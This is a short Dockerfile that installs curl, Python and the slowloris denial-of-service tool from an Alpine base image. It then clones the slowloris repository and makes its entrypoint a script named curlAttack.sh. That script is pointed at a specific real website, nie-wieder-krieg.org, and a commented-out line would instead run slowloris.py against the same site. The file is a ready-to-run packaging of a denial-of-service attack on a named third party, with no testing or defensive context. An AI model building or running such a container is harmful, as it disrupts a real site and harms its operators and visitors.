FROM alpine

RUN apk --no-cache add curl
RUN apk add --update --no-cache python3 && ln -sf python3 /usr/bin/python
RUN apk add git
RUN python3 -m ensurepip
RUN pip3 install --no-cache --upgrade slowloris
WORKDIR /usr/src/app
RUN git clone https://github.com/gkbrk/slowloris.git
COPY . .

RUN chmod +x /usr/src/app/curlAttack.sh
ENTRYPOINT ["./curlAttack.sh", "https://nie-wieder-krieg.org"]
#ENTRYPOINT ["python3", "slowloris/slowloris.py", "https://nie-wieder-krieg.org"]